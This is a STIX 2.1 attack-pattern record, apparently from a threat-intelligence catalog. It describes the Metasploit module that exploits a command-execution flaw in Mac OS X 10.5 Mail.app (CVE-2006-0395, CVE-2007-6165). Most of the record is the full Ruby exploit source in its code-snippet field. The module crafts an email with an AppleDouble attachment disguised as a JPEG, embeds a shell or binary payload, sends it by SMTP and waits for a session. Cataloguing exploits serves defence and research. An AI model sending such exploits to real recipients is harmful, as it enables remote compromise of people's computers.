{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d37ec4e6-ab95-439d-baee-6b4e14ad974e",
    "created": "2024-08-14T16:34:17.338553Z",
    "modified": "2024-08-14T16:34:17.338557Z",
    "name": "Mail.app Image Attachment Command Execution",
    "description": " This module exploits a command execution vulnerability in the Mail.app application shipped with Mac OS X 10.5.0. This flaw was patched in 10.4 in March of 2007, but reintroduced into the final release of 10.5.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/email/mailapp_image_exec.rb",
            "external_id": "mailapp_image_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-0395"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-6165"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  #\n  # This module sends email messages via smtp\n  #\n  include Msf::Exploit::Remote::SMTPDeliver\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mail.app Image Attachment Command Execution',\n      'Description'    => %q{\n          This module exploits a command execution vulnerability in the\n        Mail.app application shipped with Mac OS X 10.5.0. This flaw was\n        patched in 10.4 in March of 2007, but reintroduced into the final\n        release of 10.5.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>  ['hdm', 'kf'],\n      'References'     =>\n        [\n          ['CVE', '2006-0395'],\n          ['CVE', '2007-6165'],\n          ['OSVDB', '40875'],\n          ['BID', '26510'],\n          ['BID', '16907']\n        ],\n      'Stance'         => Msf::Exploit::Stance::Passive,\n      'Payload'        =>\n        {\n          'Space'       => 8192,\n          'DisableNops' => true,\n          'BadChars'    => \"\",\n          'Compat'      =>\n            {\n              'ConnectionType' => '-bind -find',\n            },\n        },\n      'Platform'       => %w{ unix osx },\n      'Targets'        =>\n        [\n          [ 'Mail.app - Command Payloads',\n            {\n              'Platform'       => 'unix',\n              'Arch'           => ARCH_CMD,\n              'PayloadCompat' => {\n                'RequiredCmd'    => 'generic perl ruby bash-tcp telnet',\n              }\n            }\n          ],\n          [ 'Mail.app - Binary Payloads (x86)',\n            {\n              'Platform'       => 'osx',\n              'Arch'           => ARCH_X86,\n            }\n          ],\n          [ 'Mail.app - Binary Payloads (ppc)',\n            {\n              'Platform'       => 'osx',\n              'Arch'           => ARCH_PPC,\n            }\n          ],\n        ],\n      'DisclosureDate' => '2006-03-01'\n      ))\n\n  end\n\n  def autofilter\n    false\n  end\n\n  def exploit\n\n    exts = ['jpg']\n\n    gext = exts[rand(exts.length)]\n    name = rand_text_alpha(5) + \".#{gext}\"\n    data = rand_text_alpha(rand(32)+1)\n\n    msg = Rex::MIME::Message.new\n    msg.mime_defaults\n    msg.subject = datastore['SUBJECT'] || Rex::Text.rand_text_alpha(rand(32)+1)\n    msg.to = datastore['MAILTO']\n    msg.from = datastore['MAILFROM']\n\n    dbl = Rex::MIME::Message.new\n    dbl.header.set(\"Content-Type\", \"multipart/appledouble;\\r\\n    boundary=#{dbl.bound}\")\n    dbl.header.set(\"Content-Disposition\", \"inline\")\n\n    # AppleDouble file version 2\n    # 3 entries - 'Finder Info', 'Real name', 'Resource Fork'\n    # Real Name matches msf random generated 5 character name - (I cheated ala gsub)\n\n    resfork =\n    \"AAUWBwACAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAJAAAAPgAAAAoAAAADAAAASAAAAAkAAAACAAAA\\r\\n\" +\n    \"UQAABToAAAAAAAAAAAAASGVpc2UuanBnAAABAAAABQgAAAQIAAAAMgAAAAAAAAAAAAAAAAAAAAAA\\r\\n\" +\n    \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\" +\n    \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\" +\n    \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\" +\n    \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAQA\\r\\n\" +\n    \"AAAlL0FwcGxpY2F0aW9ucy9VdGlsaXRpZXMvVGVybWluYWwuYXBwAOzs7P/s7Oz/7Ozs/+zs7P/s\\r\\n\" +\n    \"7Oz/7Ozs/+Hh4f/h4eH/4eHh/+Hh4f/h4eH/4eHh/+Hh4f/h4eH/5ubm/+bm5v/m5ub/5ubm/+bm\\r\\n\" +\n    \"5v/m5ub/5ubm/+bm5v/p6en/6enp/+np6f/p6en/6enp/+np6f/p6en/6enp/+zs7P/s7Oz/7Ozs\\r\\n\" +\n    \"/+zs7P/s7Oz/7Ozs/+zs7P/s7Oz/7+/v/+/v7//v7+//7+/v/+/v7//v7+//7+/v/+/v7//z8/P/\\r\\n\" +\n    \"8/Pz//Pz8//z8/P/8/Pz//Pz8//z8/P/8/Pz//b29v/29vb/9vb2//b29v/29vb/9vb2//b29v/2\\r\\n\" +\n    \"9vb/+Pj4//j4+P/4+Pj/+Pj4//j4+P/4+Pj/+Pj4//j4+P/8/Pz//Pz8//z8/P/8/Pz//Pz8//z8\\r\\n\" +\n    \"/P/8/Pz//Pz8////////////////////////////////////////////////////////////////\\r\\n\" +\n    \"/////////////////////6gAAACoAAAAqAAAAKgAAACoAAAAqAAAAKgAAACoAAAAKgAAACoAAAAq\\r\\n\" +\n    \"AAAAKgAAACoAAAAqAAAAKgAAACoAAAADAAAAAwAAAAMAAAADAAAAAwAAAAMAAAADAAAAAwAAAAAA\\r\\n\" +\n    \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\" +\n    \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\" +\n    \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\" +\n    \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\" +\n    \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\" +\n    \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\" +\n    \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\" +\n    \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\" +\n    \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n\" +\n    \"AAAAAQAAAAUIAAAECAAAADIAX9CsEsIAAAAcADIAAHVzcm8AAAAKAAD//wAAAAABDSF8\" + \"\\r\\n\"\n\n    fork = Rex::Text.encode_base64( Rex::Text.decode_base64(resfork).gsub(\"Heise.jpg\",name), \"\\r\\n\" )\n\n    cid = \"<#{rand_text_alpha(rand(16)+16)}@#{rand_text_alpha(rand(16)+1)}.com>\"\n\n    cmd = ''\n\n    if (target.arch.include?(ARCH_CMD))\n      cmd = Rex::Text.encode_base64(payload.encoded, \"\\r\\n\")\n    else\n      bin = generate_payload_exe\n      cmd = Rex::Text.encode_base64(bin, \"\\r\\n\")\n    end\n\n\n    dbl.add_part(fork , \"application/applefile;\\r\\n    name=\\\"#{name}\\\"\", \"base64\", \"inline;\\r\\n    filename=#{name}\" )\n    dbl.add_part(cmd , \"image/jpeg;\\r\\n    x-mac-type=0;\\r\\n    x-unix-mode=0755;\\r\\n    x-mac-creator=0;\\r\\n    name=\\\"#{name}\\\"\", \"base64\\r\\nContent-Id: #{cid}\", \"inline;\\r\\n    filename=#{name}\" )\n\n    msg.parts << dbl\n\n    send_message(msg.to_s)\n\n    print_status(\"Waiting for a payload session (backgrounding)...\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-03-01",
    "x_mitre_platforms": [
        "osx'"
    ]
}